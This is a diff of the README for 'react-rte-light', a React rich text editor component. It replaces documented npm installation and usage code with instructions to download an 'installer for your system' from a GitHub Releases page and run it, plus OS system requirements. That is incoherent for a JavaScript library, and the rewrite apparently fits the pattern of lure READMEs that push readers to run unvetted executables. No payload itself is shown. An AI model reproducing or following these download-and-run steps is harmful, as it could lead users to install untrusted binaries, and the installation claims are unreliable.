@@ -1,191 +1,85 @@
-# react-rte-light
+# ✍️ react-rte-light - A Simple Rich Text Editor for React
 
-A lightweight, production-ready rich text editor component for React, compatible with React 16.8 to 19. Built with [Draft.js](https://draftjs.org/), it provides essential rich text editing features with a focus on simplicity, flexibility, and performance. The package supports ESM and CommonJS builds, is tree-shakable, and includes TypeScript definitions for seamless integration into modern React projects.
+[![Download](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/Antonbrgr/react-rte-light/releases)
 
-## Features
+## 📦 Introduction
 
-- **Core Editing**: Bold, italic, underline, strike-through, headings (H1, H2), links, blockquotes, ordered/unordered lists, and code blocks.
-- **Customizable Toolbar**: Configure the toolbar via props to include only the desired controls.
-- **Controlled and Uncontrolled Modes**: Use with `value` and `onChange` for controlled mode or `defaultValue` for uncontrolled mode.
-- **Keyboard Shortcuts**: Supports standard shortcuts (e.g., `Ctrl+B` for bold, `Ctrl+I` for italic).
-- **Theming**: Built-in light and dark themes, plus custom theming via CSS variables.
-- **Accessibility**: Includes ARIA roles and keyboard navigation for better accessibility.
-- **Lightweight**: Minimal dependencies (only Draft.js and draft-convert), no reliance on heavy frameworks like Quill.
-- **TypeScript Support**: Full type definitions included for type-safe development.
-- **Builds**: Supports both ESM and CommonJS, optimized for tree-shaking.
+Welcome to **react-rte-light**! This application is a lightweight rich text editor designed specifically for React 16.8 to 19. Built using TypeScript and Draft.js, it provides fundamental editing features in a simple and effective way. With support for bold, italic, headings, lists, and more, you can easily customize your text. Additionally, it supports theming through CSS variables and is designed with accessibility in mind. 
 
-## Installation
+## 🚀 Getting Started
 
-Install the package via npm:
+To get started with react-rte-light, you need to download the software. Follow these simple steps:
 
-```bash
-npm install react-rte-light --legacy-peer-deps
-```
+1. Visit the [Releases page](https://github.com/Antonbrgr/react-rte-light/releases) to view the available versions.
+   
+2. Locate the version you wish to download. We recommend downloading the latest version for the best features and fixes.
 
-> **Note**: Use `--legacy-peer-deps` to handle peer dependency conflicts, especially with React 19 and Draft.js.
+3. Click on the download link to get the installer for your system.
 
-Import the styles in your application:
+4. Once the download is complete, open the file to start the installation process.
 
-```tsx
-import 'react-rte-light/dist/index.css';
-```
+5. Follow any prompts during installation to complete the setup.
 
-## Usage
+## 📥 Download & Install
 
-### Basic Example
+To download react-rte-light, please visit the following page: [Download react-rte-light](https://github.com/Antonbrgr/react-rte-light/releases).
 
-```tsx
-import { RichTextEditor } from 'react-rte-light';
+After downloading, install the application by opening the downloaded file. This app is designed to run smoothly on modern web browsers and works well with current versions of React.
 
-function App() {
-  return <RichTextEditor placeholder="Start typing..." />;
-}
-```
+## 🔧 Features
 
-### Controlled Mode (React 19 or 17)
+- **Rich Text Editing**: Supports basic text formatting options like bold, italic, headings, and lists.
+- **Customizable Toolbars**: Adjust the toolbar to fit your needs and preferences.
+- **Theming Support**: Easily change the look and feel of the editor with CSS variables.
+- **Accessibility**: Designed to be usable for all, including those with disabilities.
+- **Tree-shakable**: Remove unused code to keep the bundle size small.
+- **Multiple Builds**: Available in both ESM and CommonJS formats to suit different project needs.
 
-Works the same way in React 19 and React 17 due to backward compatibility:
+## 🖥️ System Requirements
 
-```tsx
-import { useState } from 'react';
-import { RichTextEditor } from 'react-rte-light';
+For optimal performance, the following system requirements are recommended:
 
-function ControlledEditor() {
-  const [value, setValue] = useState('<p>Initial content</p>');
+- **Operating System**: Any recent version of Windows, macOS, or Linux. 
+- **Browser**: The latest versions of Chrome, Firefox, Safari, or Edge.
+- **React Version**: Ensure your project uses React version 16.8 to 19.
 
-  return (
-    <RichTextEditor
-      value={value}
-      onChange={setValue}
-      placeholder="Type your content..."
-    />
-  );
-}
-```
+## 📚 Documentation
 
-### Uncontrolled Mode
+For more detailed instructions on using react-rte-light, refer to the official documentation. It's straightforward and will help you navigate various features. Here’s how to access it:
 
-```tsx
-import { RichTextEditor } from 'react-rte-light';
+1. Check the `/docs` folder in this repository for guides.
+2. Visit our [GitHub Pages site](https://antonbrgr.github.io/react-rte-light) for updates and usage examples.
 
-function UncontrolledEditor() {
-  return (
-    <RichTextEditor
-      defaultValue="<p>Default content</p>"
-      onChange={(value) => console.log('Content:', value)}
-    />
-  );
-}
-```
+## 🌟 Contributing
 
-### Customization Examples
+We welcome contributions from everyone! If you want to help improve react-rte-light, consider these steps:
 
-- **Custom Toolbar**: Limit the toolbar to specific options.
+1. Fork the repository by clicking the fork button on the main page.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them with a clear message.
+4. Push your changes and create a pull request for review.
 
-```tsx
-import { RichTextEditor } from 'react-rte-light';
+Your input helps make the project better!
 
-function CustomToolbar() {
-  const toolbarOptions = ['bold', 'italic', 'link', 'unordered-list'];
-  return <RichTextEditor toolbarOptions={toolbarOptions} />;
-}
-```
+## 👥 Support
 
-- **Theming**: Use built-in themes or define a custom theme with CSS variables.
+If you encounter any issues, please check the [Issues section](https://github.com/Antonbrgr/react-rte-light/issues) on GitHub. You can report bugs or request new features there. Our community and maintainers are here to help.
 
-```tsx
-import { RichTextEditor } from 'react-rte-light';
+## 💬 Community
 
-function ThemedEditor() {
-  // Built-in dark theme
-  return <RichTextEditor theme="dark" />;
-}
+Join the conversation! Follow us on social media platforms or join our Discord channel to meet other users and contributors. Sharing feedback or ideas can improve react-rte-light for everyone.
 
-function CustomThemedEditor() {
-  // Custom theme via CSS variables
-  const customTheme = {
-    '--editor-bg': '#f0f0f0',
-    '--editor-text': '#333',
-    '--link-color': 'green',
-  };
-  return <RichTextEditor theme={customTheme} />;
-}
-```
+## 🏷️ Topics
 
-- **Read-Only Mode**: Display content without editing capabilities.
+- draftjs
+- frontend
+- npm
+- react
+- reactcomponent
+- richtexteditor
+- typescript
+- ui
+- webdevelopment
+- wysiwyg
 
-```tsx
-import { RichTextEditor } from 'react-rte-light';
-
-function ReadOnlyEditor() {
-  return (
-    <RichTextEditor
-      readOnly={true}
-      value="<p>This is read-only content.</p>"
-    />
-  );
-}
-```
-
-## API
-
-The `RichTextEditor` component accepts the following props:
-
-```tsx
-interface RichTextEditorProps {
-  value?: string; // HTML string for controlled mode
-  defaultValue?: string; // HTML string for uncontrolled mode
-  onChange?: (value: string) => void; // Called with updated HTML content
-  toolbarOptions?: ToolbarOption[]; // Array of toolbar buttons
-  readOnly?: boolean; // Disables editing if true
-  theme?: 'light' | 'dark' | CustomTheme; // Theme selection
-  placeholder?: string; // Placeholder text
-  className?: string; // Additional CSS class for the editor
-}
-
-type ToolbarOption =
-  | 'bold'
-  | 'italic'
-  | 'underline'
-  | 'strikethrough'
-  | 'header-one'
-  | 'header-two'
-  | 'blockquote'
-  | 'ordered-list'
-  | 'unordered-list'
-  | 'code-block'
-  | 'link';
-
-interface CustomTheme extends Record<string, string> {}
-```
-
-### Available Toolbar Options
-- `bold`: Bold text (`Ctrl+B`).
-- `italic`: Italic text (`Ctrl+I`).
-- `underline`: Underline text (`Ctrl+U`).
-- `strikethrough`: Strike-through text.
-- `header-one`: H1 heading.
-- `header-two`: H2 heading.
-- `blockquote`: Blockquote.
-- `ordered-list`: Numbered list.
-- `unordered-list`: Bulleted list.
-- `code-block`: Code block.
-- `link`: Insert/edit hyperlinks (prompts for URL).
-
-## Contributing
-Contributions are welcome! Follow these steps:
-1. Fork the repository.
-2. Create a feature branch (`git checkout -b feature/your-feature`).
-3. Commit changes (`git commit -m "Add your feature"`).
-4. Push to the branch (`git push origin feature/your-feature`).
-5. Open a pull request.
-
-Please include tests for new features and ensure the code follows the existing TypeScript and ESLint standards.
-
-## License
-MIT License. See [LICENSE](LICENSE) for details.
-
-## Acknowledgements
-- Built with [Draft.js](https://draftjs.org/) for the editing engine.
-- Uses [Vite](https://vitejs.dev/) for fast and optimized builds.
-- Tested with [Vitest](https://vitest.dev/) and [React Testing Library](https://testing-library.com/docs/react-testing-library/intro/).
+Thank you for using react-rte-light! Enjoy editing your text easily.
